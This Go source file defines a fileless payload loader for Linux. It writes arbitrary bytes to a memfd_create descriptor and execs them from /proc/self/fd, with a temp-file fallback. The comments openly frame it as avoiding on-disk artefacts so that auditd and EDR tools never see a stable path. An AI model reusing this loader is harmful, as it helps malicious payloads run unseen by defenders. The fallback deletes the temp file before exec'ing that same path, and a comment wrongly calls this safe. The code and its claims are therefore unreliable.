//go:build linux

package main

import (
	"fmt"
	"os"
	"syscall"

	"golang.org/x/sys/unix"
)

// executePayload writes payload bytes to a memfd_create-backed file
// descriptor (zero on-disk artefact, lives only in process memory)
// and execve's it via /proc/self/fd/N. The current process image is
// replaced — successful execution does not return.
//
// Falls back to writing a 0o700 temp file under TMPDIR and execve'ing
// that path if memfd_create is unavailable (kernels < 3.17, sandboxed
// environments without MemoryFD support). The temp file is best-effort
// removed before exec; if exec succeeds the unlink may have already
// landed and the file is gone from the namespace before any auditd /
// EDR sees a stable path.
func executePayload(payload []byte, args []string) error {
	fd, err := unix.MemfdCreate("payload", unix.MFD_CLOEXEC)
	if err == nil {
		if _, err := unix.Write(fd, payload); err != nil {
			unix.Close(fd)
			return fmt.Errorf("memfd write: %w", err)
		}
		path := fmt.Sprintf("/proc/self/fd/%d", fd)
		argv := append([]string{path}, args...)
		// MFD_CLOEXEC means the FD itself goes away on exec, but
		// /proc/self/fd/N stays valid until execve completes the swap.
		return syscall.Exec(path, argv, os.Environ())
	}

	// Fallback: temp file. Operationally noisier — leaves a transient
	// inode under TMPDIR until the unlink races the exec.
	f, err := os.CreateTemp("", "bundle-payload-*")
	if err != nil {
		return fmt.Errorf("CreateTemp: %w", err)
	}
	tmpPath := f.Name()
	if _, err := f.Write(payload); err != nil {
		f.Close()
		os.Remove(tmpPath)
		return fmt.Errorf("temp write: %w", err)
	}
	if err := f.Chmod(0o700); err != nil {
		f.Close()
		os.Remove(tmpPath)
		return fmt.Errorf("temp chmod: %w", err)
	}
	if err := f.Close(); err != nil {
		os.Remove(tmpPath)
		return fmt.Errorf("temp close: %w", err)
	}
	// Best-effort pre-exec unlink — Linux keeps the file mapped while
	// the kernel walks the inode for execve, so this is safe.
	_ = os.Remove(tmpPath)
	argv := append([]string{tmpPath}, args...)
	return syscall.Exec(tmpPath, argv, os.Environ())
}
